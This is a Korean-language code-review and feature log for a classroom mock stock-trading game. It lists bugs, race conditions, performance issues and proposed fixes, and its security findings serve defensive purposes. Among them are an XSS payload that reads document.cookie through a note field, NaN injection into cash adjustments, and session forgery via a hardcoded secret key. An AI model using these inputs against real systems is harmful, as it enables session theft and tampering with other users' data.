- **결과 대기 폴링 주기 3초가 불필요하게 짧음** (`app.js:786-796`): `startWaitingPoll()` 이 `/api/rooms/<rid>` 를 3초마다 폴링. `results_published` 는 진행자가 수동 버튼을 누를 때만 변하므로 10초 이상 지연도 체감 없음. 교실 30명 동시 대기 시 초당 10 요청 → `3000` 을 `10000` 으로 교체(1자 수정)하면 서버 부하 70% 절감.

- **`showPausedBanner()` 빠른 연속 호출 시 배너 중복 삽입 가능성** (`app.js:653-666`): `showPausedBanner()` 내부에서 `getElementById('paused-banner')` 로 기존 배너를 확인하지만, 같은 tick 내에서 `hidePausedBanner()` → `showPausedBanner()` 가 두 번 호출되면 첫 번째 `remove()` 후 두 번째 `getElementById` 가 null을 반환해 배너 두 개가 삽입될 수 있음. 함수 첫 줄에 `document.getElementById('paused-banner')?.remove()` 를 추가해 항상 단일 배너를 보장하면 1줄 수정으로 해결.

- **`StockService.get_history()` 의 차트 날짜가 항상 UTC 기준 과거일** (`stock_service.py:296-305`): `datetime.utcfromtimestamp(now - i * 86400).strftime('%Y-%m-%d')` 로 날짜를 생성하므로, KST 기준 오전 9시 이전에 수업하면 차트의 가장 최근 봉이 전날 날짜로 표시됨. 이미 시뮬레이션 데이터라 절대 날짜가 의미 없으므로, 날짜 대신 "D-30", "D-29", … "D-1" 같은 상대 레이블로 교체하면 혼란 방지 및 UTC/KST 변환 코드도 제거 가능. `stock_service.py:297` 1줄, `app.js:1369` 레이블 처리 1줄 수정.

- **`doAuth()` 에서 학번·이름 검증 없이 서버에 요청** (`app.js:73-79`, `app.py:329-342`): 클라이언트에서 `sid` 와 `name` 의 공백·특수문자 여부를 검증하지 않아 학번에 공백이 포함되면 `username = '2 07 15 홍길동'` 처럼 파싱 기준인 첫 공백 위치가 달라져 엑셀 내보내기(`app.py:1435-1437`)의 학번·이름 분리가 깨짐. `doCreateRoom()`·`doJoinRoom()` 에서 `if (/\s/.test(sid)) { err.textContent = '학번에 공백을 포함할 수 없습니다.'; return; }` 1줄 추가로 방어 가능(`app.js:130`, `app.js:149`).

- **`doAuth()` 에서 학번·이름 검증 없이 서버에 요청** (`app.js:73-79`, `app.py:329-342`): 클라이언트에서 `sid` 와 `name` 의 공백·특수문자 여부를 검증하지 않아 학번에 공백이 포함되면 `username = '2 07 15 홍길동'` 처럼 파싱 기준인 첫 공백 위치가 달라져 엑셀 내보내기(`app.py:1435-1437`)의 학번·이름 분리가 깨짐. `doCreateRoom()`·`doJoinRoom()` 에서 `if (/\s/.test(sid)) { err.textContent = '학번에 공백을 포함할 수 없습니다.'; return; }` 1줄 추가로 방어 가능(`app.js:130`, `app.js:149`).

## 2026-07-07 (2차)

### 추가하면 좋을 기능

- **시장 탭 종목 카드에 "내 보유 주수" 배지 실시간 표시** (`app.js:1287-1311 renderGrid()`): 현재 시장 탭의 종목 카드에 본인 보유 여부 표시가 없어, 매도하려면 포트폴리오 탭으로 이동해야 함. `loadMarket()` 완료 후 `S.holdings`(또는 포트폴리오 조회 결과 캐시)를 활용해 `renderGrid()` 내부에서 `const heldShares = (S.holdings||[]).find(h=>h.symbol===st.symbol)?.shares; if(heldShares) '보유 N주' 뱃지 표시` 패턴으로 종목 카드 하단에 초록 배지를 추가하면 탭 이동 없이 현재 포지션 확인 가능. 포트폴리오 탭 진입 시 `S.holdings = data.holdings` 로 캐시 갱신하면 추가 API 호출 없이 해결. 프론트 10줄, 서버 변경 없음.

- **진행자 → 전체 참가자 앱 내 공지 전송 기능** (`app.py:540-603 host 엔드포인트`, `app.js:258-274 enterHostGame()`): 수업 중 "지금부터 바이오 섹터에 집중하세요" 같은 교사 공지를 앱 밖에서 전달해야 하는 불편이 있음. `POST /api/rooms/<rid>/host/announce {message: str}` 로 `_announcements[rid]` 인메모리 저장 → `GET /api/rooms/<rid>` 응답에 `announcement` 필드 추가 → 참가자 폴링에서 새 공지 감지 시 5초짜리 상단 배너로 표시. 서버 15줄, 프론트 20줄로 교실 운영 편의 대폭 향상.

- **게임 종료 후 진행자 화면에 수업 통계 요약 카드 표시** (`app.py:829-847 get_rankings()`, `app.js:1702-1795 loadResults()`): 진행자 결과 화면은 순위 차트만 있고 "총 거래 건수", "가장 많이 거래된 종목", "평균 수익률" 같은 클래스 전체 통계가 없음. `RoomTransaction.query.filter_by(room_id=rid).all()` 을 한 번 조회해 집계하는 `GET /api/rooms/<rid>/host/summary` 엔드포인트를 추가하고(서버 20줄), 진행자 결과 화면 상단에 "전체 거래 247건 · 최다 거래 종목 NVDA · 평균 수익률 +8.3%" 요약 카드를 렌더링하면(프론트 15줄), 교사가 수업 후 학생 투자 행동을 총평하는 소재로 활용 가능.

- **활성 예금 전체 일괄 해지 버튼** (`app.js:1621-1644 loadDepositsPage()`, `app.py:904-916 withdraw_deposit()`): 학생이 여러 예금을 보유한 채 올인 투자 기회를 발견했을 때 각 예금을 개별 해지해야 하는 번거로움이 있음. `active.length >= 2` 인 경우 목록 하단에 "전체 해지" 버튼을 추가하고, 클라이언트에서 `Promise.all(active.map(d => api.del(...)))` 로 병렬 해지 요청 후 `loadDepositsPage()` 를 재호출하면 서버 변경 없이 해결(프론트 10줄).

- **관심 종목(watchlist) 서버 동기화로 교차 기기 지속** (`app.js:17`, `app.js:1279-1284 toggleWatchlist()`): 관심 종목이 `localStorage`에만 저장되어 학생이 다른 컴퓨터로 이동하거나 브라우저를 교체하면 초기화됨. 교실에서 학생이 자리를 바꾸는 상황에 빈번히 발생. `RoomMember` 모델에 `watchlist VARCHAR(500)` 컬럼 추가(models.py) → `PATCH /api/rooms/<rid>/watchlist {symbols: [...]}` 엔드포인트(10줄) → `toggleWatchlist()` 에서 `localStorage` 저장과 동시에 API 호출. 로그인 시 서버에서 watchlist를 복구하면 기기 독립적 관심 목록 유지 가능.

- **진행자 시장 탭 인기 보유 종목 TOP5 실시간 표시** (`app.py:542-562 host_members()`, `app.js:313-357 loadHostMarket()`): 진행자 시장 탭에는 주가만 있고 학생들이 어떤 종목에 집중하는지 파악 불가. `GET /api/rooms/<rid>/host/popular-stocks` 엔드포인트를 추가해 `RoomHolding.query.filter_by(room_id=rid).all()` 로 종목별 보유자 수·총 보유 주수를 집계하고(서버 12줄), 진행자 시장 탭 상단에 "🔥 인기 종목 TOP5 — 삼성바이오 9명, NVDA 7명…" 를 표시하면(프론트 15줄), 교사가 "왜 이 종목이 인기일까요?" 토론 유도 가능. `loadHostMarket()` 호출 시 함께 갱신.

### 제거/단순화할 것들

- **룰렛·퀴즈 강제 청산 경로에서 zombie `RoomHolding` 레코드 누적** (`app.py:1037-1038`, `app.py:1317-1318`): 룰렛 베팅 자금 마련 시 주식 전량 매도 후 `h.shares = 0; h.avg_price = 0` 만 처리하고 `db.session.delete(h)` 를 하지 않음. 퀴즈 패널티 청산 코드(`app.py:1318`)도 동일. 정상 `trade()` 엔드포인트(`app.py:762`)에는 `if holding.shares == 0: db.session.delete(holding)` 가 있어 일관성이 없음. `get_portfolio()` 와 `member_total_value()` 는 `h.shares <= 0` 건너뜀 체크로 정확성은 유지되지만, DB에 shares=0 레코드가 시간이 갈수록 누적됨. 두 청산 경로 모두 `h.shares = 0` 처리 직후 `if h.shares == 0: db.session.delete(h)` 를 추가하면 해결.

- **퀴즈 이중 제출 TOCTOU — 빠른 연타 시 보상 중복 지급 가능** (`app.py:1270-1342`): `submit_quiz()` 진입 직후 `_quiz_state[key]` 확인 후 보상/패널티를 계산하고 마지막에 `cooldown_until = time.time() + 60` 으로 갱신(`app.py:1341`). 동시 요청 2개가 0.5초 차이로 들어오면 첫 번째 요청의 state 갱신이 DB commit 전이라 두 번째 요청도 통과해 동일 퀴즈에 두 번 보상이 지급됨. `app.py:1278` state 확인 직후, 보상 계산 전에 `_quiz_state[key] = {'qid': None, 'cooldown_until': time.time() + 60, 'seen': state.get('seen', set())}` 를 미리 설정해 진입 즉시 쿨다운 처리하면 TOCTOU 방어 가능.

- **`host_adjust` delta NaN 입력 시 회원 현금이 NaN으로 오염** (`app.py:595-599`): `delta = float(d.get('delta', 0))` 후 `math.isfinite(delta)` 체크 없이 바로 `m.cash = max(0, m.cash + delta)` 수행. 공격자가 `{"delta": "nan"}` 전송 시 Python `float('nan')` 이 조용히 처리되어 `m.cash = nan` → 이후 `member_total_value()`, 렝킹 정렬, 엑셀 내보내기 등 모든 계산에서 NaN이 전파됨. `app.py:596` 에 `import math; if not math.isfinite(delta): return jsonify({'error': '잘못된 금액'}), 400` 2줄 추가로 방어. `create_room` 의 `starting_cash`·`deposit_rate`(`app.py:385-386`)도 동일 취약점.

- **`create_room` 숫자 변환에 ValueError 미처리로 500 에러 발생 가능** (`app.py:384-386`): `int(d.get('duration_minutes', 30))`, `float(d.get('starting_cash', 10_000_000))` 에 try-except 없음. 클라이언트가 `{"duration_minutes": "abc"}` 전송 시 `int("abc")` 에서 ValueError → Flask 500 Internal Server Error 반환. 같은 파일의 `trade()` 엔드포인트(`app.py:738-739`)는 `try: shares = int(...) except: return 400` 패턴으로 처리하고 있어 일관성이 없음. `create_room()` 상단에 동일 패턴의 try-except 블록을 추가하면 방어적으로 400 반환 가능.

- **`get_rankings()`·`host_members()` 의 N+1 쿼리 문제** (`app.py:808-824`, `app.py:542-562`): 두 함수 모두 전체 멤버를 먼저 조회 후 각 멤버에 대해 `member_total_value()` 를 개별 호출. `member_total_value()` 내부(`app.py:107-118`)에서 `RoomHolding.query.filter_by(room_id=rid, user_id=uid)` 와 `Deposit.query.filter_by(room_id=rid, user_id=uid)` 를 각각 1회씩 실행하므로, 30명 방 기준 `/rankings` 1회 호출 시 최소 62회 DB 쿼리 발생. `RoomHolding.query.filter_by(room_id=rid).all()` 과 `Deposit.query.filter_by(room_id=rid, status='active').all()` 을 각각 1회 bulk 조회 후 `{user_id: records}` dict로 그룹핑하면 2번의 쿼리로 동일 결과 달성 가능.

- **기본 `SECRET_KEY` 가 공개 레포에 평문 하드코딩** (`app.py:13`): `app.secret_key = os.environ.get('SECRET_KEY', 'mock-stock-game-secret-2024')` — `SECRET_KEY` 환경변수를 설정하지 않으면 `'mock-stock-game-secret-2024'` 라는 공개된 고정 키로 Flask 세션 쿠키가 서명됨. 이 키를 아는 누구나 `itsdangerous` 로 임의 `user_id` 를 담은 세션 쿠키를 위조해 다른 사용자로 로그인 가능. fallback을 `secrets.token_hex(32)` 로 교체하면 재시작마다 랜덤 키가 생성되어 기존 세션이 무효화되는 대신 세션 위조는 불가능해짐. 운영 환경에서는 반드시 `SECRET_KEY` 환경변수를 설정해야 한다는 경고를 `app.py` 상단에 `if not os.environ.get('SECRET_KEY'): warnings.warn(...)` 으로 추가하는 것도 권장.

## 2026-07-08

### 추가하면 좋을 기능

- **게임 종료 1분 카운트다운 취소 기능 없음** (`app.py:527-537`, `app.js:540-552`): 진행자가 실수로 "게임 종료" 버튼을 누르면 `end_time = now + 60s` 로 단축되고 `_ending_soon.add(rid)` 되어 UI에서 버튼이 비활성화됨. 취소 수단이 없어 실수 시 무조건 1분 안에 게임이 끝남. `POST /api/rooms/<rid>/cancel-end` 엔드포인트를 추가해 `_ending_soon.discard(rid)` + `room.end_time += timedelta(seconds=60 - elapsed)` 로 복구하고, 프론트에서 `ending_soon=True` 일 때 "⏰ 1분 후 종료" 버튼 옆에 "취소" 버튼을 표시하면 진행자 실수를 바로잡을 수 있음. 서버 10줄, 프론트 5줄.

- **참가자 로비에 본인 이름 하이라이트 없음** (`app.js:582-585`): `loadPLobbyMembers()` 에서 참가자 목록을 렌더링할 때 `S.user.username === m.username` 비교를 통해 본인 항목에 "나" 배지(`<span class="chip chip-blue">나</span>`)를 표시하면, 학생이 자기 이름이 올바르게 입력됐는지 바로 확인 가능. 교실에서 이름을 잘못 입력한 학생이 재입장해야 할 상황을 빠르게 인지할 수 있음. 1줄 수정.

- **`_quiz_settings`, `_roulette_config` 서버 재시작 시 초기화** (`app.py:250`, `app.py:1246`): 퀴즈 보상/패널티 비율(`_quiz_settings`)과 룰렛 확률 설정(`_roulette_config`)이 모두 인메모리 딕셔너리. Render 무료 플랜은 15분 비활성 시 서버를 슬립·재시작하므로, 긴 수업 중 잠시 활동이 끊기면 진행자가 세심하게 설정한 값이 기본값으로 리셋됨. `Room` 모델에 `quiz_reward_pct FLOAT DEFAULT 1.0`, `quiz_penalty_pct FLOAT DEFAULT 0.5`, `rlt_config TEXT DEFAULT NULL` 컬럼을 추가하고(모델 3줄 + migration), `quiz_settings`·`host_roulette_config` 엔드포인트에서 DB 저장·로드로 전환하면 영속성 보장. 대안: `get_room_service()` 재초기화 시 Room에서 설정값을 읽어오는 방식도 가능.

- **`host_force_price()` 호출 후 앱 레벨 뉴스 캐시 미갱신** (`app.py:684-687`, `app.py:71-84`): `force_price()` 호출 시 `StockService._news` 는 즉시 업데이트되지만(`stock_service.py:234-240`), `app.py` 의 `_news_cache` 는 갱신되지 않음. 이후 참가자의 `GET /api/rooms/<rid>/news` 요청이 최대 2초(`NEWS_CACHE_TTL`)간 이전 캐시를 반환해, 진행자가 방금 강제 조정한 종목의 뉴스가 늦게 전파됨. `app.py:686` (결과 반환 직전)에 `_invalidate_news_cache(rid)` 1줄 추가로 즉시 수정 가능. `host_send_news()` 는 이미 `_invalidate_news_cache(rid)` 를 호출하고 있어(`app.py:700`) 동일 패턴.

- **`rlt_triggered=True` + Render 재시작 시 게임 무기한 일시정지 고착** (`app.py:446-465`, `app.py:467-468`): 게임 종료 5초 전 룰렛 자동 발동(`rlt_triggered=True`, `status='paused'`) 후 Render가 재시작되면 `_rlt_active[rid]` 는 `{'count': 0, 'auto_paused': True}` 로 초기화됨. 이 상태에서 모든 참가자가 이미 3번 스핀을 완료했거나 룰렛을 닫아 `minigame/open` 을 재호출하지 않으면, `minigame/close` 도 발생하지 않아 게임이 무기한 `paused` 로 고착됨. 학생 화면에는 일시정지 배너만 표시됨. 진행자 설정 탭에서 `room.rlt_triggered && room.status === 'paused'` 일 때 "🎰 룰렛 강제 종료 후 게임 마무리" 버튼을 표시하고, `POST /api/rooms/<rid>/force-end-roulette` 로 `_end_room()` 을 직접 호출하면 최소한의 방어책이 됨.

### 제거/단순화할 것들

- **`create_room()` stale 방 정리 쿼리에 `waiting` 상태 방 미포함** (`app.py:372-374`): 진행자가 방을 만들고 학생들을 기다리다 이탈하면 `waiting` 상태로 남음. `stale_cutoff` 쿼리가 `status.in_(['active','paused'])` 만 검사하므로 2시간이 지나도 `waiting` 방은 정리되지 않아, 다음 수업에 방을 새로 만들면 "이미 진행 중인 방이 있습니다." 오류 발생. `app.py:374` 직전에 `stale_waiting = Room.query.filter(Room.host_id == user.id, Room.status == 'waiting', Room.created_at < stale_cutoff).first(); if stale_waiting: db.session.delete(stale_waiting); db.session.commit()` 3줄 추가로 해결.

- **`refreshMyRank()` 가 `execTrade()` 직후와 10초 폴링 양쪽에서 중복 호출** (`app.js:1453`, `app.js:647`): `execTrade()` 성공 후 `refreshMyRank()`(`app.js:1453`)를 즉시 호출하고, 10초 폴링(`app.js:647`)에서도 항상 `refreshMyRank()` 를 호출. `refreshMyRank()` 내부에서 `GET /api/rooms/<rid>/rankings` 를 실행하는데, 이는 모든 멤버에 대해 N+1 DB 쿼리를 유발. 거래 직후에는 서버가 이미 반환한 `data.cash` 를 사용해 상단 `pg-cash` 를 업데이트하는 것으로 충분하며, 순위 변화 반영은 다음 폴링 주기에 맡겨도 됨. `execTrade()` 의 `refreshMyRank()` 호출(app.js:1453)을 제거하거나 debounce(1000ms) 처리.

- **진행자 로비·게임 탭 강퇴/조정 버튼 onclick 인라인 이스케이프 취약** (`app.js:229`, `app.js:425`): `onclick="doKickMember(${m.user_id},'${m.username.replace(/'/g,"\\'")}')"` — `m.username` 에 역슬래시·쌍따옴표·HTML 특수문자가 포함되면 이스케이프가 불완전해 onclick 속성 탈출 또는 JS 오류 발생 가능. 학생 이름이 사용자 입력값 그대로 전달되므로 XSS 벡터가 될 수 있음. `data-uid="${m.user_id}" data-name="${escHtml(m.username)}"` 속성에 값을 분리 저장하고 `onclick="kickFromAttr(this)"` → `function kickFromAttr(b){doKickMember(+b.dataset.uid, b.dataset.name)}` 패턴으로 교체하면 이스케이프 불필요. 동일 패턴이 진행자 게임 탭 `host-members-list` 렌더링(`app.js:424-425`)에도 존재.

- **`setDepPct()` 의 10,000원 단위 절삭으로 소액 시작 자금에서 예금 버튼이 동작 안 함** (`app.js:1597-1600`): `Math.floor(cash * pct / 100 / 10000) * 10000` — 시작 자금이 100만원 미만이거나 현금이 5만원 이하일 때 "10%" 버튼을 누르면 결과가 0이 되어 입력값이 비워짐. `app.js:1598` 의 `amount > 0 ? amount : ''` 부분을 `amount >= 10000 ? amount : Math.floor(cash * pct / 100)` 으로 수정하면, 소액에서도 1원 단위로 정상 동작하며 최소 예금 금액 체크는 서버에 위임.

- **자동 생성 뉴스의 방향 힌트(`show_hint`)가 수동 전송 한 번으로 영구 변경됨** (`stock_service.py:155-158`, `app.py:693-701`): `trigger_news(show_hint)` 가 `self._show_hint = show_hint` 를 저장하고, 이후 자동 뉴스 생성 `_maybe_generate_news()` → `_generate_news(show_hint=None)` 이 `self._show_hint` 를 사용하는 구조. 진행자가 체크박스를 해제하고 뉴스를 한 번 전송하면 이후 모든 자동 뉴스도 힌트 없이 발행됨. 이 연동이 의도된 동작인지 UI에 전혀 표시되지 않음. 설정 탭에 "자동 뉴스 힌트 기본 표시" 영속 토글(`GET/POST /api/rooms/<rid>/host/news-interval` 에 `default_show_hint` 파라미터 추가)을 분리하면 명시적 제어 가능. 단기 해결책: `trigger_news()` 의 `self._show_hint` 저장을 제거하고 자동 뉴스는 항상 `True`, 수동 전송만 파라미터를 따르도록 분리(`stock_service.py:204-209`).

## 2026-07-08 (2차)

### 추가하면 좋을 기능

- **`lottery_draw()` + `get_lottery()` 동시 실행 시 `_do_reveal()` 이중 호출로 당첨금 이중 지급 위험** (`app.py:1185-1207`, `app.py:1122-1130`): `lottery_draw()` 가 `_lottery_lock` 없이 `_do_reveal(rid, cur)` 를 호출하는 반면, `get_lottery()` 의 타임아웃 자동추첨은 `with _lottery_lock:` 블록 안에서 실행됨. 진행자가 "추첨" 버튼을 누르는 동시에 10초 타임아웃이 만료되면 두 경로가 동시에 `_do_reveal()` 에 진입해 DB에 당첨금이 이중 지급될 수 있음. `lottery_draw()` 에도 `with _lottery_lock: if _lottery_state.get(rid, {}).get('state') == 'drawing': _do_reveal(rid, cur)` 형태로 Lock 범위를 확장하고, `_do_reveal()` 내부에서 상태를 먼저 `'revealed'` 로 전환 후 DB 업데이트하는 check-and-set 패턴으로 방어 필요.

- **거래 내역 `note` 필드 XSS — `host_adjust()` 자유 입력값이 innerHTML 에 직접 삽입** (`app.py:596`, `app.js:530`, `app.js:1581`): `loadStudentTxn()`(`app.js:530`)과 `loadTxn()`(`app.js:1581`) 모두 `` `${t.note}` `` 를 innerHTML 로 렌더링함. `host_adjust()` 가 note 를 별도 검증 없이 DB에 저장하므로, 교사 계정이 `<img src=x onerror=alert(document.cookie)>` 같은 값을 note 로 입력하면 거래 내역을 조회하는 모든 학생 화면에서 JS 가 실행됨. 기존에 문서화된 XSS 항목은 `username` 필드를 대상으로 했으나 `note` 필드는 미언급. `t.note` 렌더링 전 `escHtml()` 함수를 적용하거나 `textContent` 로 교체하면 해결.

- **모바일 화면 회전 시 종목 차트 크기 미갱신** (`app.js:1375-1398`): Chart.js 에 `responsive: true` 가 설정되어 있지만 `orientationchange` 이벤트 리스너가 없음. 세로 모드에서 차트를 열고 가로로 회전하면 차트가 좁은 세로 폭에 고정된 채 유지됨. `window.addEventListener('orientationchange', () => { if (S.stockChart) S.stockChart.resize(); })` 한 줄 추가로 해결 가능. `resize` 이벤트와 함께 등록하면 일반 브라우저 창 크기 변경도 대응.

- **퀴즈 쿨다운 일괄 강제 초기화 엔드포인트 부재** (`app.py:1244-1246`): 교사가 "다시 풀어봅시다"라고 해도 `_quiz_cooldowns[rid][uid]` 의 60초 쿨다운이 만료될 때까지 학생들이 재시도 불가. `POST /api/rooms/<rid>/host/reset-quiz-cooldowns` 엔드포인트를 추가해 `_quiz_cooldowns.pop(rid, None)` 한 줄로 해당 방의 모든 쿨다운을 즉시 초기화하면 수업 흐름 개선. 진행자 퀴즈 탭 UI에 "쿨다운 초기화" 버튼과 연결.

- **`openStockModal()` 매번 portfolio API 호출 → 학생 30명 동시 모달 오픈 시 N+1 쿼리 급증** (`app.js:1344-1351`): 학생이 종목을 클릭할 때마다 `GET /api/rooms/<rid>/portfolio` 를 호출하고, 해당 엔드포인트는 RoomHolding + Deposit 을 별도 쿼리로 조회함. 교실 전체 학생이 동시에 모달을 열면 순간적으로 수십 개 요청이 발생. `S.portCache = {data: null, ts: 0}` 상태 변수를 추가하고 `Date.now() - S.portCache.ts < 5000` 이면 캐시 재사용, 매매 성공(`execTrade`) 시 `S.portCache.ts = 0` 으로 캐시 무효화하면 불필요한 API 호출을 크게 줄일 수 있음.

- **`startNewsPolling()` `S.newsTs = 0` 초기화로 게임 진입 직후 오래된 뉴스 팝업이 무조건 표시** (`app.js:807-819`): `S.newsTs` 를 `0` 으로 초기화하면 첫 폴링(~8초 후)에서 서버가 반환하는 임의 타임스탬프가 항상 0 보다 크므로 "신규 뉴스" 로 판정해 팝업이 뜸. 학생이 게임에 막 입장했을 때 이미 몇 분 전에 발행된 뉴스가 팝업으로 나타나 혼란을 줌. `enterParticipantGame()` 에서 `startNewsPolling()` 을 호출하기 전 `S.newsTs = Math.floor(Date.now() / 1000)` 으로 현재 시각을 설정하면 게임 진입 이후 발행된 뉴스만 팝업으로 표시.

### 제거/단순화할 것들

- **`get_room()` 내 `cur_user()` 3회 중복 호출 — 요청당 최소 2회 DB 왕복 낭비** (`app.py:439`, `app.py:444`, `app.py:473`): `cur_user()` 가 `db.session.get(User, session['user_id'])` 를 실행하는데, `get_room()` 함수 내에서 자동 종료 early-return 경로(`app.py:439`), paused 자동 종료 경로(`app.py:444`), 정상 반환 경로(`app.py:473`) 각각에서 별도로 호출됨. 함수 시작부에서 `user = cur_user()` 를 한 번만 실행하고 이하 세 경로에서 재사용하면 요청당 최소 2회 DB 쿼리 절감. 폴링 빈도가 높은 엔드포인트이므로 효과 큼.

- **`create_room()` `starting_cash` float 소수점 미정규화 — 소수점 초기 자금으로 오차 누적** (`app.py:385`): `starting_cash=max(100000, float(d.get('starting_cash', 10_000_000)))` — `"1000000.5"` 같은 입력을 허용해 `Room.starting_cash` (Float 컬럼)에 소수점 값이 저장됨. 이후 현금 초기화, 수익률 계산, 이자 계산 모두 이 값을 기준으로 하므로 부동소수점 오차가 누적. `int(round(float(...)))` 로 정수화 후 저장하도록 한 줄 수정으로 해결. `deposit_rate` 도 소수점 자릿수를 `round(rate, 2)` 로 제한하는 검증 추가 권장.

- **`host_adjust()` `user_id` 타입 미검증 — PostgreSQL 환경에서 DataError → 500 오류** (`app.py:594-597`): `target_uid = d.get('user_id')` 후 바로 `RoomMember.query.filter_by(room_id=rid, user_id=target_uid)` 실행. JSON 바디에서 `"user_id": "abc"` 로 전송 시 SQLite 에서는 0 rows → 404 이지만, PostgreSQL 정수 컬럼에 문자열을 비교하면 `DataError` 가 발생해 500 응답. `try: target_uid = int(d.get('user_id')) except (TypeError, ValueError): return jsonify({'error': '잘못된 사용자 ID'}), 400` 가드 한 블록 추가로 방어.

- **`get_quiz()` / `submit_quiz()` QUIZ_QUESTIONS 선형 탐색 반복 — dict 로 교체하면 O(n)→O(1)** (`app.py:1265`, `app.py:1283`): `next((x for x in QUIZ_QUESTIONS if x['id'] == state['qid']), None)` 패턴이 두 라우트에서 동일하게 반복. `education_data.py` 에서 `QUIZ_QUESTIONS_MAP = {q['id']: q for q in QUIZ_QUESTIONS}` 를 한 번 생성하고 `app.py` 에서 `from education_data import QUIZ_QUESTIONS_MAP` 후 `QUIZ_QUESTIONS_MAP.get(state['qid'])` 로 조회하면 O(n) → O(1). 문제 수가 늘어날수록 효과가 커지며, 코드 중복도 제거됨.

- **`export_rankings()` 내부 `import openpyxl` — 모듈 레벨 import 로 이동하여 명시성 향상** (`app.py:1422-1424`): `try: import openpyxl ... except ImportError: return ... 415` 패턴이 함수 바디 안에 있어 의존성이 숨겨져 있음. 배포 환경에서 `openpyxl` 누락 시 엑셀 내보내기 요청이 올 때까지 오류가 드러나지 않음. `requirements.txt` 에 `openpyxl` 을 명시하고 파일 상단에서 `import openpyxl` 을 실행하되, 누락 시 `ImportError` 가 앱 시작 시점에 발생하도록 변경하면 운영 중 런타임 오류를 사전에 방지. 또는 현재 패턴을 유지하되 `requirements.txt` 누락 여부만 CI 에서 검증.

---

## 2026-07-09

### 추가하면 좋을 기능

- **QR 코드 스캔 후 방 코드 자동 입력** (`app.js:195-206`, `app.js:143-169`): `_makeQR()` 에서 `?code=${S.room.code}` 파라미터를 포함한 URL 을 QR 에 인코딩하지만, 페이지 진입 시 이 파라미터를 읽어 `join-code` 입력을 자동 채우는 코드가 없음. 학생이 QR 을 스캔해도 코드를 다시 손으로 입력해야 함. `app.js` 최상단 초기화 코드에 `const _urlCode = new URLSearchParams(location.search).get('code'); if (_urlCode) { showScreen('screen-join'); document.getElementById('join-code').value = _urlCode.toUpperCase(); document.getElementById('join-student-id').focus(); }` 를 추가하면 QR 스캔 → 이름 입력 → 입장 3단계로 단축됨. 서버 변경 불필요.

- **게임 진행 중 강퇴 기능** (`app.py:564-575`): `kick_member()` 엔드포인트가 `room.status != 'waiting'` 조건으로 대기 중인 방에서만 강퇴를 허용. 게임 시작 후 이름을 잘못 입력한 학생이나 중도 이탈자를 처리할 방법이 없음. 활성 게임 중 강퇴를 허용하되, 강퇴 시 보유 주식을 현재가로 자동 청산하고 `RoomHolding` 삭제 + `RoomMember` 삭제를 원자적으로 처리하는 로직(`_end_room()` 내 청산 로직 참조, `app.py:144-152`)을 `kick_member()` 에 추가하면 됨. 대기 중 vs 진행 중 강퇴 처리 분기만 추가하면 구현 가능.

- **복권 기본 상금 상한 제한** (`app.py:419`): 자동 복권 시작 시 기본 상금이 `member_count * 30_000_000` (30명 교실 → 9억원). 시작 자금이 1천만원인 경우 복권 한 번으로 순위가 완전히 역전될 수 있음. 교육 목적상 주식 실력이 아닌 복권 운이 최종 결과를 좌우하는 문제. `default_prize = min(member_count * 30_000_000, room.starting_cash * 5)` 처럼 시작 자금의 N배를 상한으로 두거나, 진행자가 수동으로 시작할 때(`app.py:1085-1087`)처럼 자동 시작 때도 진행자 확인을 거치는 방식 권장.

- **주식 단일 종목 최대 비중 경고** (`app.js:1424-1454`, 거래 UI): 현재 전재산을 단 하나의 종목에 투자 가능해 고위험·고수익 전략이 우선됨. 경제 수업 취지에 맞게 단일 종목 비중이 총 자산의 50% 초과 시 매수 버튼 클릭 전 `"⚠️ 이 종목에 총 자산의 XX% 이상 투자됩니다. 계속하시겠습니까?"` confirm 대화상자를 표시하는 정도면 충분. 서버 검증 불필요, `execTrade()` (`app.js:1424`) 내 분기 추가만으로 구현.

- **진행자 공지 전송 기능** (`app.py` 신규 엔드포인트, `app.js:startNewsPolling()`): 폭탄뉴스는 주가 힌트를 포함한 자동 이벤트지만, 진행자가 "지금부터 반도체 섹터 뉴스에 주목하세요" 같은 순수 텍스트 공지를 전체 참가자에게 보내는 방법이 없음. `GET /api/rooms/<rid>/news` 응답에 `notice: str | null` 필드를 추가하고, `POST /api/rooms/<rid>/host/notice` 로 설정하면, 기존 뉴스 폴링(`startNewsPolling()`, `app.js:807-819`)을 재사용해 참가자 화면에 별도 배너로 표시 가능. 서버 측 신규 필드 2개 + 클라이언트 배너 렌더링으로 구현 가능.

- **게임 중 예금 금리 변경 기능** (`models.py:34`, `app.py:878-902`): `Room.deposit_rate` 는 방 생성 시에만 설정되고 게임 중 변경 불가. "오늘 기준금리가 인상되었습니다" 같은 경제 이벤트를 연출할 수 없음. `Room` 모델에 `current_deposit_rate` 컬럼을 추가하거나, 진행자 설정 탭에 `PATCH /api/rooms/<rid>/host/deposit-rate` 엔드포인트를 연결해 `room.deposit_rate` 를 실시간으로 바꾸면 됨. 이미 생성된 예금은 가입 시 `d.rate` 를 각자 보유하고 있으므로(`models.py:88`) 소급 적용 없이 새 예금부터 신금리 적용.

---

### 제거/단순화할 것들

- **`showHome` = `showLanding` 불필요한 별칭** (`app.js:99`): `function showHome() { showLanding(); }` 한 줄짜리 함수. 파일 내 어디서도 `showHome` 이 호출되지 않음 (전체 `app.js` 에서 `showHome` 검색 시 정의부 외 사용 없음). 함수 삭제 후 혹시 남은 참조가 있다면 `showLanding()` 으로 직접 교체하면 됨.

- **`api.get/post/del` 오류 응답 바디 무시** (`app.js:31-45`): `if (!r.ok) return {error: \`HTTP \${r.status}\`}` 패턴으로 서버가 반환하는 실제 오류 메시지(`data.error` JSON 필드)를 버리고 HTTP 상태 코드만 노출. 학생 화면에서 "HTTP 400" 이라는 의미 없는 오류가 표시되는 경우 발생. `if (!r.ok) { const body = await r.json().catch(() => ({})); return {error: body.error || \`HTTP \${r.status}\`}; }` 로 교체하면 서버 오류 메시지를 그대로 표시 가능. 3개 메서드 모두 동일 패턴이므로 일괄 수정.

